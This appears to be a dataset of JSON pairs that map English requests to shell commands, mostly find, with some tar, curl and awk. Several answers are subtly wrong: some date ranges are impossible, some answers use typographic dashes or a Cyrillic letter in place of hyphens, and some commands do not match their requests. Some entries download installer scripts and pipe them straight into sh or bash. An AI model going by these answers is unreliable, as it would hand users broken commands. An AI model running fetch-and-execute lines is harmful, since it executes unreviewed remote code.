{"input": "display all the details of empty files in current folder", "answer": "find . -size 0 -printf '%M %n %u %g %s %Tb\\n \\b%Td %Tk:%TM %p\\n'"}
{"input": "display all the directories in the current folder", "answer": "find . -type d -print"}
{"input": "display all the directories in the current folder and create a skeleton of make directory commands with all these folders", "answer": "find -type d|sed -r '/^.$/{s:.:#!/bin/bash:};{s/^\\./mkdir -p &/}'"}
{"input": "display all the directories in the current folder excluding those that are present in the .svn directory tree", "answer": "find -type d -path '.svn' -prune -o -print"}
{"input": "display all the directories in the current folder excluding those that are present in the aa directory tree", "answer": "find . -type d -name aa -prune -o -print"}
{"input": "display all the directories in the current folder excluding those that are present in the folder secret", "answer": "find . -name secret -type d -prune -o -print"}
{"input": "display all the directories in the current folder for the files which have not been accessed in the last 48 hours", "answer": "find . -type d -atime +2"}
{"input": "display all the directories in the current folder which are atleast one level deep", "answer": "find . -mindepth 1 -type d -print0"}
{"input": "display all the directories in the current folder which start with processor followed by digit and ends with .1 or .2", "answer": "find . -type d -regextype posix-egrep -regex '\\./processor[0-9]*/10\\.(1|2)'"}
{"input": "display all the directories in the folder /path/to/dest except tmp and cache directories", "answer": "find /path/to/dest -type d \\( ! -name tmp \\) -o \\( ! -name cache \\) -print"}
{"input": "display all the directories in the folder /path/to/dest except tmp directory", "answer": "find /path/to/dest -type d \\( ! -name tmp \\) -print"}
{"input": "display all the directories in the folder master-", "answer": "find master -type d | sort"}
{"input": "display all the empty files in the entire file system", "answer": "find / -size 0 -print"}
{"input": "display all the file in the folder /home/david/ which start with the word \"index\"", "answer": "find /home/david -name 'index*'"}
{"input": "display all the file in the folder /home/david/ which start with the word \"index\" ( case insensitive search)", "answer": "find /home/david -iname 'index*'"}
{"input": "display all the files  in the current folder excluding the current folder and do not search in the sub directories", "answer": "find . -maxdepth 1 -type d \\( ! -name . \\)"}
{"input": "display all the files  in the current folder excluding the perl files", "answer": "find . -not -name \"*.pl\""}
{"input": "display all the files  in the current folder excluding those which are present in \"./src/emacs\" folder", "answer": "find  .  -path  './src/emacs'  -prune  -o -print"}
{"input": "display all the files  in the current folder which have colon in their name", "answer": "find . -name \"*:*\""}
{"input": "display all the files along with their group name in the folder /home which do not belong to the group test", "answer": "find /home ! -group test -printf \"%p:%g\\n\""}
{"input": "display all the files and directories with the name \"CVS\"  from /usr/src folder that are at least seven levels deep and do not descend onto the folders", "answer": "find /usr/src -name CVS -prune -o -depth +6 -print"}
{"input": "display all the files ending with \".foo\" excluding those that are in the directory \".snapshot\"", "answer": "find . -name .snapshot -prune -o -name '*.foo' -print"}
{"input": "display all the files ending with \".foo\" including those that are in the directory \".snapshot\", this is the wrong way of using prune", "answer": "find . \\( -name .snapshot -prune -o -name '*.foo' \\) -print"}
{"input": "display all the files ending with \".user\" in /var/adm/logs/morelogs/ and excluding all regular files", "answer": "find /var/adm/logs/morelogs/* -type f -prune -name \"*.user\" -print"}
{"input": "display all the files ending with \".user\" or beginning with \"admin\" or ending with \".user.gz\" in /var/adm/logs/morelogs/ and excluding  all regular files", "answer": "find /var/adm/logs/morelogs/* -type f -prune \\( -name \"admin.*\" -o -name \"*.user\" -o -name \"*.user.gz\" \\) -print"}
{"input": "display all the files having spaces in the current folder", "answer": "find . -name \"filename including space\""}
{"input": "display all the files having the word \"searched phrasse\" in their name in the current folder excluding those from the paths \"/tmp/\" and \"./var/log\"", "answer": "find . -type f -name \"*searched phrasse*\" ! -path \"./tmp/*\" ! -path \"./var/log/*\""}
{"input": "display all the files in current directory with each file name displayed twice in the same row", "answer": "find . | sed 's/.*/& &/'"}
{"input": "display all the files in current folder which are bigger than 10KB", "answer": "find . -size +10k"}
{"input": "display all the files in current folder which have been accessed in the last 15 days", "answer": "find . -atime -15"}
{"input": "display all the files in current folder which have been changed in the last 2-6 days", "answer": "find . -cmin +2 -cmin -6"}
{"input": "display all the files in current folder which have been changed in the last 24 hours", "answer": "find . -ctime -1 -print"}
{"input": "display all the files in current folder which have write permission to all the users", "answer": "find . -perm /222"}
{"input": "display all the files in current folder which start with \"file2015-0\"", "answer": "find . -name \"file2015-0*\""}
{"input": "display all the files in the current directory and do not search in sub directories", "answer": "find . -maxdepth 1 -print0"}
{"input": "display all the files in the current directory and do not search in the sub directories", "answer": "find . -maxdepth 0 -print"}
{"input": "display all the files in the current directory excluding the paths \"targert\", \"tools\", \"git\"", "answer": "find . \\( ! -path \"*target*\" -a ! -path \"*tools*\" -a ! -path \"*.git*\" -print \\)"}
{"input": "display all the files in the current directory excluding those that are in the 'secret' directory", "answer": "find . -name 'secret' -prune -o -print"}
{"input": "display all the files in the current folder along with the change time and display file names of the last 10 changed files", "answer": "find . -type f -printf \"%C@ %p\\n\" | sort -rn | head -n 10"}
{"input": "display all the files in the current folder along with the hidden files with the depth", "answer": "find . \u2014 name \"*\" \u2014 print -\u043e -name \".*\" \u2014 print -depth"}
{"input": "display all the files in the current folder along with the modification time and display file names of the last 10 modified files", "answer": "find . -type f -printf '%T@ %p\\n' | sort -n | tail -10 | cut -f2- -d\" \""}
{"input": "display all the files in the current folder and do not search in sub directories and move them to the directory /directory1/directory2", "answer": "find . -maxdepth 1 -type f | xargs -I '{}' sudo mv {} /directory1/directory2"}
{"input": "display all the files in the current folder and traverse from the sub directories", "answer": "find . -type d -depth"}
{"input": "display all the files in the current folder except those whose name is \"PERSONAL\"", "answer": "find . -name PERSONAL -prune -o -print"}
{"input": "display all the files in the current folder excluding search in the paths containing the folder having the word \"mmm\"", "answer": "find . ! -path *mmm*"}
{"input": "display all the files in the current folder excluding the directory aa", "answer": "find . -type d ! -name aa"}
{"input": "display all the files in the current folder excluding the file states_to_csv.pl and those that are present in the directories whose name starts with \".git\"", "answer": "find . \\! -path \"./.git*\" -a \\! -name states_to_csv.pl"}
{"input": "display all the files in the current folder excluding the files with the name mmm", "answer": "find . -name mmm -prune -o -print"}
{"input": "display all the files in the current folder excluding those ending with \".disabled\" in sorted order", "answer": "find /target/ | grep -v '\\.disabled$' | sort"}
{"input": "display all the files in the current folder excluding those that are present in the folder \"secret\"", "answer": "find . \\( -name 'secret' -a -prune \\) -o -print"}
{"input": "display all the files in the current folder excluding those that are present in the path \"./etc\"", "answer": "find . ! -wholename \"./etc*\""}
{"input": "display all the files in the current folder excluding those that are present in the sub directory aa and display those files that start with the word \"file\"", "answer": "find . \\( -type d -name aa -prune \\) -o \\( -type f -name 'file*' -print \\)"}
{"input": "display all the files in the current folder excluding those which are in the path of \".git\"", "answer": "find . ! -path  \"*.git*\" -type f -print"}
{"input": "display all the files in the current folder expect perl shell and python fiels", "answer": "find . -not -name \"*.pl\" -not -name \"*.sh\" -not -name \"*.py\""}
{"input": "display all the files in the current folder for the files which have been accessed in the last 24 hours", "answer": "find . -type f -atime -1"}
{"input": "display all the files in the current folder for the files which have not been accessed in the last 24 hours", "answer": "find . -type f -atime +1"}
{"input": "display all the files in the current folder in a single line separated by null command", "answer": "sudo find . -print0"}
{"input": "display all the files in the current folder that are at least one week old (7 days) but less then 30 days old", "answer": "find . -mtime +30 -a -mtime -7 -print0"}
{"input": "display all the files in the current folder that have been modified in the last 24 hours", "answer": "find  -mtime -1"}
{"input": "display all the files in the current folder which are bigger than 100MB and save the output list to the file /root/big.txt", "answer": "find \\( -size +100M -fprintf /root/big.txt %-10s %p\\n \\)"}
{"input": "display all the files in the current folder which are in the path \"./sr*sc\"", "answer": "find . -path './sr*sc'"}
{"input": "display all the files in the current folder which are in the path ending with the folder f", "answer": "find .  -path '*f'"}
{"input": "display all the files in the current folder which are present in the path \"./sr*sc\"", "answer": "find . -path './sr*sc'"}
{"input": "display all the files in the current folder which are present in the path \"./src/emacs\"", "answer": "find . -path './src/emacs' -prune -o -print"}
{"input": "display all the files in the current folder which contains form feed (^L) and does not contain NULL", "answer": "find . | xargs grep -PL \"\\x00\" | xargs grep -Pl \"\\x0c\""}
{"input": "display all the files in the current folder which do not belong to any group", "answer": "find . -nogroup"}
{"input": "display all the files in the current folder which do not belong to any user", "answer": "find . -nouser"}
{"input": "display all the files in the current folder which hare in the sub directory trees of the folders which begin with the word \"kt\" followed by a digit", "answer": "find . -path './kt[0-9] '"}
{"input": "display all the files in the current folder which have are bigger than 1KB", "answer": "find . -size +1024 -print"}
{"input": "display all the files in the current folder which have been modified after the files \"/bin/sh\"", "answer": "find . -newer /bin/sh"}
{"input": "display all the files in the current folder which have been modified between two dates", "answer": "find . -newermt 'Sep 1 2006' -and \\! -newermt 'Sep 10 2006'"}
{"input": "display all the files in the current folder which have been modified in one hour ago", "answer": "find .  -newermt \"1 hour ago\""}
{"input": "display all the files in the current folder which have been modified in the last 14*24 hours", "answer": "find . -mtime -14 -print"}
{"input": "display all the files in the current folder which have been modified in the last 2 days", "answer": "find . -mtime -2"}
{"input": "display all the files in the current folder which have been modified in the last 24 hours", "answer": "find . -mtime -1"}
{"input": "display all the files in the current folder which have been modified in the last 24 hours excluding all directories", "answer": "find . \\( -type d ! -name . -prune \\) -o \\( -mtime -1 -print \\)"}
{"input": "display all the files in the current folder which have been modified in the last 5*24 hours", "answer": "find . -mtime -5"}
{"input": "display all the files in the current folder which have not been modified in the last 7 days and which are not in the list \"file.lst\"", "answer": "find -mtime +7 -print | grep -Fxvf file.lst"}
{"input": "display all the files in the current folder which have the permissions 777 and which have been modified in the last 24 hours", "answer": "find . -perm 777  -mtime 0 -print"}
{"input": "display all the files in the current folder which have the word \"bills\" in their name", "answer": "find . -name '*bills*' -print"}
{"input": "display all the files in the current folder which start with either \"fileA_\" or \"fileB_\"", "answer": "find . -name 'fileA_*' -o -name 'fileB_*'"}
{"input": "display all the files in the directory modules", "answer": "find . -name modules"}
{"input": "display all the files in the entire file system", "answer": "find / -name \"*\" \u2014 print"}
{"input": "display all the files in the entire file system which are bigger than 10MB", "answer": "find / -size +10000k"}
{"input": "display all the files in the entire file system which begin with \"apache-tomcat\"", "answer": "find / -name \"apache-tomcat*\""}
{"input": "display all the files in the entire file system which have set uid bit set", "answer": "find / -perm -u+s -print"}
{"input": "display all the files in the file system excluding all the \".c\" files", "answer": "find / \\! -name \"*.c\" -print"}
{"input": "display all the files in the file system which are changed a minute ago", "answer": "find / -newerct '1 minute ago' -print"}
{"input": "display all the files in the file system which are present in nfs system", "answer": "find / -fstype nfs -print"}
{"input": "display all the files in the file system which belong to no group", "answer": "find / -nogroup staff -print"}
{"input": "display all the files in the file system which belong to the group lighttpd", "answer": "find / -group lighttpd -print"}
{"input": "display all the files in the file system which belong to the user \"user1\"", "answer": "find / -user user1"}
{"input": "display all the files in the file system which belong to the user \"wnj\" and which are modified after the file \"ttt\"", "answer": "find / -newer ttt -user wnj -print"}
{"input": "display all the files in the file system which belong to the user \"wnj\" or which are modified after the file \"ttt\"", "answer": "find / \\( -newer ttt -or -user wnj \\) -print"}
{"input": "display all the files in the file system which belong to the user with the id 1005", "answer": "find / -uid 1005"}
{"input": "display all the files in the file system which do not belong to the user \"wnj\" and which are modified before the file \"ttt\"", "answer": "find / \\! \\( -newer ttt -user wnj \\) -print"}
{"input": "display all the files in the file system which have been modified in the last 10 minutes", "answer": "find / -mmin -10"}
{"input": "display all the files in the folder \"$ORIG_DIR\"", "answer": "find \"$ORIG_DIR\""}
{"input": "display all the files in the folder \"/Users/Me/Desktop\" which have read permission to them", "answer": "find /Users/Me/Desktop -readable"}
{"input": "display all the files in the folder \"/dev\" which belong to the user \"peter\"", "answer": "find /dev -user \"peter\" |more"}
{"input": "display all the files in the folder \"/home/mywebsite\" which have been changed in the last 7*24 horus", "answer": "find /home/mywebsite -type f -ctime -7"}
{"input": "display all the files in the folder /etc /srv excluding those that are present in the path of ./srv/tftp/pxelinux.cfg* and /etc/mtab", "answer": "find /etc /srv \\! -path \"./srv/tftp/pxelinux.cfg*\" -a \\! -name /etc/mtab"}
{"input": "display all the files in the folder /home which have the setuid bit enabled", "answer": "find /home -perm /u=s"}
{"input": "display all the files in the folder /mp3-collection which are bigger than 10MB or which start with the name \"Metallica\"", "answer": "find /mp3-collection -name 'Metallica*' -or -size +10000k"}
{"input": "display all the files in the folder a", "answer": "find a"}
{"input": "display all the files in the folders /etc /srv excluding the paths /etc/mtab and  /srv/tftp/pxelinux.cfg", "answer": "find /etc /srv \\( -path /srv/tftp/pxelinux.cfg -o -path /etc/mtab \\)  -prune -o -print"}
{"input": "display all the files in the folders mydir1, mydir2 which are bigger than 2KB and have not been accessed in the last 30*24 hours", "answer": "find /mydir1 /mydir2 -size +2000 -atime +30 -print"}
{"input": "display all the files in the home folder", "answer": "find $HOME -print"}
{"input": "display all the files in the home folder except text files", "answer": "find /home ! -name \"*.txt\""}
{"input": "display all the files in the home folder excluding directories which have been modified in the last 24 hours", "answer": "find /home/ -mtime -1 \\! -type d"}
{"input": "display all the files in the home folder that have been modified in the last 24 hours", "answer": "find $HOME -mtime -1"}
{"input": "display all the files in the home folder which are smaller than 500 bytes", "answer": "find $HOME -size -500b"}
{"input": "display all the files in the home folder which begin with \"arrow\"", "answer": "find ~ -name 'arrow*'"}
{"input": "display all the files in the home folder which begin with \"arrow\" and end with \"xbm\"", "answer": "find ~ -name 'arrow*.xbm'"}
{"input": "display all the files in the home folder which belong to the suer \"bruno\" and end with \".sxw\" and have been accessed in the last 3*24 hours", "answer": "find /home -type f -name *.sxw -atime -3 -user bruno"}
{"input": "display all the files in the home folder which end with \".xbm\"", "answer": "find ~ -name '*.xbm'"}
{"input": "display all the files in the home folder which have not been modified in the last 365*24 hours", "answer": "find $HOME -mtime +365"}
{"input": "display all the files in the home folder which have read permission to the user", "answer": "find /home -perm /u=r"}
{"input": "display all the files in the kat folder", "answer": "find kat -printf \"%f\\n\""}
{"input": "display all the files in the user folder which have been modified after the files /tmp/stamp$$", "answer": "find /usr -newer /tmp/stamp$$"}
{"input": "display all the files in the usr folder and those that are in the path local", "answer": "find /usr/ -path \"*local*\""}
{"input": "display all the files in the usr folder which have been modified after Feburary 1st", "answer": "find /usr -newermt \"Feb 1\""}
{"input": "display all the files on the current folder excluding those that are present in the folder \"./src/emacs\"", "answer": "find . -path ./src/emacs -prune -o -print"}
{"input": "display all the files only in the path \"./sr*sc\"", "answer": "find . -path \"./sr*sc\""}
{"input": "display all the files with the names \"name1\" and \"name2\" in the current folder and do not search in the sub directories", "answer": "find . -maxdepth 1 -name \"name1\" -o -name \"name2\""}
{"input": "display all the header files  and cpp files in the current folder", "answer": "find . -name \\*.h -print -o -name \\*.cpp -print"}
{"input": "display all the hidden directories in the directory \"/dir/to/search/\"", "answer": "find /dir/to/search -path '*/.*' -print"}
{"input": "display all the hidden files in the directory \"/dir/to/search/\"", "answer": "find /dir/to/search/ -name \".*\" -print"}
{"input": "display all the hidden files in the folder /home", "answer": "find /home -name \".*\""}
{"input": "display all the home folder which end with the extension \"sxw\" and which have been accessed in the last 3*24 hours and which belong to the user bruno", "answer": "find /home -type f -name \"*.sxw\" -atime -3 -user bruno"}
{"input": "display all the html files in the current folder", "answer": "find . -name \"*.html\" -print"}
{"input": "display all the html files in the current folder excluding search in the path ./foo", "answer": "find . -path \"./foo\" -prune -o -type f -name \"*.html\""}
{"input": "display all the html files in the current folder excluding search in the paths ./foo, ./bar", "answer": "find . -path \"./foo\" -prune -o -path \"./bar\" -prune -o -type f -name \"*.html\""}
{"input": "display all the html files in the current folder that have been modified exactly 7*24 hours ago", "answer": "find . -mtime 7 -name \"*.html\" -print"}
{"input": "display all the html files in the current folder that have been modified in the last 7*24 hours", "answer": "find . -mtime -7 -name \"*.html\" -print"}
{"input": "display all the html files in the current folder that have not been modified in the last 7*24 horus", "answer": "find . -mtime +7 -name \"*.html\" -print"}
{"input": "display all the html files in the folder /var/www", "answer": "find /var/www -type f -name \"*.html\""}
{"input": "display all the ip addresses in all the files that are present in /etc folder", "answer": "find /etc -exec grep '[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*' {} \\;"}
{"input": "display all the jars in the current folder", "answer": "find . -iname '*.jar'"}
{"input": "display all the java script files in a folder", "answer": "find src/js -name '*.js'"}
{"input": "display all the java script files in the current folder", "answer": "find . -name \"*.js\""}
{"input": "display all the java, xml and action scripts (.as) files in a directory", "answer": "find dir1 -type f -a \\( -name \"*.java\" -o -name \"*.as\" -o -name \"*.xml\" \\)"}
{"input": "display all the jpg files in the current folder and do not search in sub directories", "answer": "find . -maxdepth 1 -mindepth 1 -iname '*.jpg' -type f"}
{"input": "display all the jpg files in the current folder which belong to the user nobody", "answer": "find . -name *.jpg -user nobody"}
{"input": "display all the jpg images in current folder", "answer": "find . -type f -iregex '.*\\.jpe?g'"}
{"input": "display all the log files in the folder /var/log, print0 is used to handle files with only spaces in their names or which have newlines in their names", "answer": "find /var/log -name \"*.log\" -print0"}
{"input": "display all the normal/regular files in the current folder", "answer": "find . -type f"}
{"input": "display all the normal/regular files in the directory FOLDER1", "answer": "find FOLDER1 -type f -print0"}
{"input": "display all the php files in the entire file system", "answer": "find / -name \"*.php\""}
{"input": "display all the regular files in current folder excluding all the directories and all the sub directories having \"normal\" in their name", "answer": "find . \\( \\( -path \"\\.?.*\" -type d \\) -o -path \"*normal*\" \\) -prune -o \\( -type f \\) -print"}
{"input": "display all the regular files in current folder that belong to the user \"tom\"", "answer": "find . -type f -user tom"}
{"input": "display all the regular files in the current folder excluding those that are present in the path \"git\"", "answer": "find . -path \"*.git\" -prune -o -type f -print"}
{"input": "display all the regular files in the folder \"$(FOLDER)\" which are modified in the last $(RETENTION)*24 hours and excluding hidden files", "answer": "find ${FOLDER} -type f ! -name \\\".*\\\" -mtime -${RETENTION}"}
{"input": "display all the regular/normal files ending with \".mod\" in a folder", "answer": "find \"$dir\" -name \"*.mod\" -type f -print0"}
{"input": "display all the regular/normal files in a folder", "answer": "find $FILES_PATH -type f"}
{"input": "display all the regular/normal files in current directory", "answer": "find . -type f"}
{"input": "display all the regular/normal files in current folder", "answer": "find . -type f -name \\*"}
{"input": "display all the regular/normal files in the current directory", "answer": "find . -type f"}
{"input": "display all the regular/normal files in the current folder excluding the files \"bbb\" and \"yyy\"", "answer": "find . \\( -name bbb -o -name yyy \\) -prune -o -type f -print"}
{"input": "display all the regular/normal files in the current folder excluding the files with the name mmm", "answer": "find . -name mmm -prune -o -type f -print"}
{"input": "display all the regular/normal files in the current folder which are modified after a file", "answer": "find . -type f -newer \"$FILE\""}
{"input": "display all the regular/normal files in the current folder which have been modified in the last 24 hours", "answer": "find . -mtime 0 -type f"}
{"input": "display all the regular/normal files in the folder /path/ which have not been modified today ( from day start ie, 00:00 )", "answer": "find /path/ -type f -daystart -mtime +0"}
{"input": "display all the regular/normal files in the home folder that have been modified in the last 1 day (from the start of day ie, from 00:00 )", "answer": "find ~/ -daystart -type f -mtime 1"}
{"input": "display all the soft links in a  folder which are not broken", "answer": "find -L /target ! -type l"}
{"input": "display all the text and pdf files in the current folder", "answer": "find . -regex \".*\\(\\.txt\\|\\.pdf\\)$\""}
{"input": "display all the text files  in the current folder", "answer": "find . -name \"*.txt\" -print"}
{"input": "display all the text files and hidden files in the home folder", "answer": "find ~ -name \"*.txt\" \u2014 print -o -name \".*\" \u2014 print"}
{"input": "display all the text files and pdf files in the current folder", "answer": "find . \\( -name \"*.txt\" -o -name \"*.pdf\" \\)"}
{"input": "display all the text files from the current folder and skip searching in skipdir1 and skipdir2 folders", "answer": "find . \\( -name skipdir1 -prune , -name skipdir2 -prune -o -name \"*.txt\" \\) -print"}
{"input": "display all the text files in a folder", "answer": "find $1 -type f -name '*'$n'.txt'"}
{"input": "display all the text files in current folder", "answer": "find . -name \"*.txt\""}
{"input": "display all the text files in the current folder", "answer": "find -name '*.txt'"}
{"input": "display all the text files in the current folder  and do not search in the bin directory", "answer": "find . -name bin -prune -o -name \"*.txt\" -print"}
{"input": "display all the text files in the current folder except readme files", "answer": "find . -type f -name \"*.txt\" ! -name README.txt -print"}
{"input": "display all the text files in the current folder which have been modified in the last half minute ( 30 seconds )", "answer": "find . -mmin 0.5"}
{"input": "display all the text files in the home folder", "answer": "find /home -name \"*.txt\""}
{"input": "display all the text files in the home folder ( case insensitive search )", "answer": "find /home -iname \"*.txt\""}
{"input": "display all the text files in the temp folder", "answer": "find /tmp -name *.txt"}
{"input": "display all the trace files (\".trc\") from the folder $DBA/$ORACLE_SID/bdump/ which have not been accessed in the last 7*24 hours", "answer": "find $DBA/$ORACLE_SID/bdump/*.trc -mtime +7"}
{"input": "display all the users in the current folder that belong to the group \"sunk\"", "answer": "find . -type f -group sunk"}
{"input": "display all the users in the current folder which do not belong to the user root", "answer": "find . ! -user root"}
{"input": "display files ending with \".ext\" in current folder excluding those that are present in the list list.txt", "answer": "find -type f -name '*.ext' | grep -vFf list.txt"}
{"input": "display files ending with \".ext\" in current folder which are present in the file \"foo\"", "answer": "find . -type f -name \\*.ext | xargs grep foo"}
{"input": "display files in current folder ending with \"pdf\" or \"PDF\"", "answer": "find . -name '*.pdf' -or -name '*.PDF'"}
{"input": "display in a list of all the files that are bigger than 10KB in current folder", "answer": "find . -size +10k -ls"}
{"input": "display list of all the C files ( fuiles with \".c\" extension ) in current folder", "answer": "find . -name '*.c' -ls"}
{"input": "display list of all the files in the /tmp folder", "answer": "find /tmp/ -exec ls \"{}\" +"}
{"input": "display list of all the files in the current directory (print0 handles file names with newlines or spaces)", "answer": "find -print0 | xargs -0 ls"}
{"input": "display list of all the files in the current folder which are empty", "answer": "find . -size 0 -ls"}
{"input": "display list of all the hidden directories in the directory \"/dir/to/search/\"", "answer": "find /dir/to/search -path '*/.*' -ls"}
{"input": "display list of all the hidden files in the directory \"/dir/to/search/\"", "answer": "find /dir/to/search/ -name \".*\" -ls"}
{"input": "display list of all the hidden files in the home folder", "answer": "find $HOME -name \".*\" -ls"}
{"input": "display list of all the hidden regular/normal files in the directory \"/dir/to/search/\"", "answer": "find /dir/to/search/ -type f -iname \".*\" -ls"}
{"input": "display list of all the regular/normal files in the current folder which start with \"my\"", "answer": "find . -name 'my*' -type f -ls"}
{"input": "display list of all the regular/normal files in the home folder which are bigger than 512 kb", "answer": "find /home/ -type f -size +512k -exec ls -lh {} \\;"}
{"input": "display list of all the regular/normal files in the home folder which are exactly 6579 bytes", "answer": "find /home/ -type f -size 6579c -exec ls {} \\;"}
{"input": "display long list of all the files in the folder /home/peter which belong to no user and change the owner,group of all these files (after user confirmation) to \"peter\",\"peter\"", "answer": "find /home/peter -nouser -exec ls -l {} \\; -ok chown peter.peter {} \\;"}
{"input": "display long list of all the perl files in the current folder", "answer": "find . -name \"*.pl\" -ls"}
{"input": "display long listing of all files in the current directory whose size is 24 or 25 bytes (doesnt display inode information) ", "answer": "find . -size -26c -size +23c -exec ls -l '{}' \\;"}
{"input": "display long listing of all files in the current directory whose size is 24 or 25 bytes", "answer": "find . -size -26c -size +23c -ls"}
{"input": "display long listing of all normal/regular files in the current directory which have been modified in the last 2 days", "answer": "find . -mtime -2 -type f -name \"t*\" -exec ls -l '{}' \\;"}
{"input": "display long listing of all the files in the root folder which are bigger than 3KB", "answer": "find / -dev -size +3000 -exec ls -l {} ;"}
{"input": "display long listing of all the files that have been changed in the last 4 days, daystart is used to compare from the starting of day i.e, at 00:00", "answer": "find . -daystart -ctime 4 -ls -type f"}
{"input": "display long listing of all the regular hidden files in the folder Musica", "answer": "find M\u00fasica/* -type f -name \".*\" -exec ls -l {} \\;"}
{"input": "display long listing of all the symbolic links in the current folder", "answer": "find . -type l -exec ls -l {} \\;"}
{"input": "display long listing of all the text files in the current folder", "answer": "find . -name \"*.txt\" -exec ls -la {} \\;"}
{"input": "display long listing of all the text files in the current folder (plus at the end executes quickly by sending bulk data as input to the command in exec)", "answer": "find . -name \"*.txt\" -exec ls -la {} +"}
{"input": "display long listing of first 10 directories in the current folder", "answer": "find . -type d -ls | head"}
{"input": "display only the file names of all the files which end with \".deb\"", "answer": "find . -name '*.deb' -printf \"%f\\n\""}
{"input": "display table of files with their name, owner, and size in bytes", "answer": "find . -printf 'Name: %f Owner: %u %s bytes\\n'"}
{"input": "display ten files in the current directory", "answer": "find | head"}
{"input": "display ten files in the tmp directory", "answer": "find /tmp  | head"}
{"input": "display top 11 files along with the last access date for all the files in the file system", "answer": "find / -type f -printf \"\\n%AD %AT %p\" | head -n 11"}
{"input": "displays all the files in the current folder", "answer": "find ."}
{"input": "download a file \"http://download.oracle.com/otn-pub/java/jce/8/jce_policy-8.zip\" using cookies \"oraclelicense=accept-securebackup-cookie\"", "answer": "curl -L -C - -b \"oraclelicense=accept-securebackup-cookie\" -O http://download.oracle.com/otn-pub/java/jce/8/jce_policy-8.zip"}
{"input": "download contents from \"https://raw.github.com/creationix/nvm/master/install.sh\" and execute", "answer": "curl https://raw.github.com/creationix/nvm/master/install.sh | sh"}
{"input": "download contents from \"https://www.npmjs.com/install.sh\" and execute", "answer": "curl https://www.npmjs.com/install.sh | sh"}
{"input": "download contents of a website \"http://example.com/\"", "answer": "curl http://example.com/"}
{"input": "download contents of a website \"https://get.scoop.sh\"", "answer": "curl -L https://get.scoop.sh"}
{"input": "download file  \"https://raw.githubusercontent.com/creationix/nvm/v0.31.0/install.sh\" and execute it", "answer": "curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.31.0/install.sh | bash"}
{"input": "exclude vendor and app/cache dir, and search name which suffixed with php", "answer": "find . -name *.php -or -path \"./vendor\" -prune -or -path \"./app/cache\" -prune"}
{"input": "execute a command in 10 seconds", "answer": "true | sleep 10"}
{"input": "execute command \"who\" when key \"\\eW\" is pressed", "answer": "bind -x '\"\\eW\":\"who\"'"}
{"input": "explicitly list all files in the current directory", "answer": "find . -print"}
{"input": "extract \"backup.tar.gz\" with verbose output", "answer": "tar -xzvf backup.tar.gz"}
{"input": "extract \"filename.tar.xz\" with verbose output", "answer": "$ tar xvfJ filename.tar.xz"}
{"input": "extract \"phantomjs-1.9.0-linux-x86_64.tar.bz2\"", "answer": "sudo tar xvf phantomjs-1.9.0-linux-x86_64.tar.bz2"}
{"input": "extract 'archive.tar.gz' to /destination", "answer": "tar xzf archive.tar.gz -C /destination"}
{"input": "extract /path/to/my_archive.tar.xz to /path/to/extract and preserve permissions", "answer": "tar xpvf /path/to/my_archive.tar.xz -C /path/to/extract"}
{"input": "extract archive stored in $1", "answer": "tar -zxvf $1"}
{"input": "extracts text between pattern1 and pattern2 if and only if the pattern1 is followed by pattern2", "answer": "tac infile | sed -ne '/pattern2/,/pattern1/ p' | tac -"}
{"input": "file all the Sticky Bit set files whose permission are 551", "answer": "find / -perm 1551"}
{"input": "file1 and file2 contain lines of comma-separated information, for each line whose first field matches, and where 3rd field of file1 matches 2nd field of file2, 6th field of file1 matches 3rd field of file2, and 7th field of file1 matches 4th field of file2, output: fields 1, 2, 3, 4, 6, and 7 of file1", "answer": "join -t, file1 file2 | awk -F, 'BEGIN{OFS=\",\"} {if ($3==$8 && $6==$9 && $7==$10) print $1,$2,$3,$4,$6,$7}'"}
{"input": "file1.txt and file2.txt both contain a name and a number on each line. For each name whose corresponding number does not match in both files, display the \"Age of ... is different\" message", "answer": "join file{1,2}.txt | awk '$2 != $3 { print \"Age of \" $1 \" is different\" }'"}
{"input": "files all files which expect directories and display count of them", "answer": "find /usr/share \\! -type d wc -l"}
{"input": "find  case-insensitive StringBuffer in all *.java files", "answer": "find . -type f -name \"*.java\" -exec grep -il string {} \\;"}
{"input": "find  file which case-insensitive name is too in currect directory", "answer": "find . -iname foo"}
{"input": "find  files which  full path name is /tmp/foo/bar under foo directory and print", "answer": "find foo -path /tmp/foo/bar -print"}
{"input": "find  files which full path name is /tmpfoo/bar under /tmp/foo directory and print", "answer": "find /tmp/foo -path /tmp/foo/bar -print /tmp/foo/bar"}
{"input": "find  files which full path name is /tmpfoo/bar under foo directory and print", "answer": "find foo -path /tmp/foo/bar -print"}
{"input": "find  files which full path name is foo/bar under foo directory and print", "answer": "find foo -path /tmp/foo/bar -print"}
{"input": "find  js file which name is not  'glob-for-excluded-dir'  under current directory", "answer": "find . -name '*.js' -\\! -name 'glob-for-excluded-dir' -prune"}
{"input": "find \".flac\" files in current folder using regular expressions", "answer": "find ./ -regex \"./cmn-.\\.flac\""}
{"input": "find & Substitute Only When the Line Matches with the Pattern Using sed", "answer": "find . -type f -name \"*.txt\" -exec sed '/\\-/s /\\-.*//g'  {} \\;"}
{"input": "find *.gif files under the currently directory and sub-directories and list them using the ls command", "answer": "find . -name *.gif -exec ls {} \\;"}
{"input": "find -name '*.js' -not -path './node_modules/*' -not -path './vendor/*'", "answer": "find -name '*.js' -not \\( -path './node_modules/*' -o -path './vendor/*' \\)"}
{"input": "find .bmp or .txt files", "answer": "find /home/user/Desktop -name '*.bmp' -o -name '*.txt'"}
{"input": "find .gif files in /var/www and below that were last changed between 90 and 180 days ago", "answer": "find /var/www -name *.gif -ctime +90 -ctime -180"}
{"input": "find StringBuffer in all *.java files", "answer": "find . -type f -name \"*.java\" -exec grep -l StringBuffer {} \\;"}
{"input": "find StringBuffer in all *.java files, ignoring case", "answer": "find . -type f -name \"*.java\" -exec grep -il string {} \\;"}
{"input": "find Texinfo source files in /usr/local/doc", "answer": "find /usr/local/doc -name '*.texi'"}
{"input": "find a 'fool.scala' named regular file under /opt /usr /var those directories", "answer": "find /opt /usr /var -name foo.scala -type f"}
{"input": "find a difference between website content of \"http://tldp.org/LDP/abs/html/\" and \"http://www.redhat.com/mirrors/LDP/LDP/abs/html/\"", "answer": "diff <(curl -s http://tldp.org/LDP/abs/html/) <(curl -s http://www.redhat.com/mirrors/LDP/LDP/abs/html/)"}
{"input": "find a specfic video file in the current directory", "answer": "find ./ -name \"foo.mp4\" -exec echo {} \\;"}
{"input": "find al the files that are modified exactly 2 days ago", "answer": "find -daystart -mtime 2"}
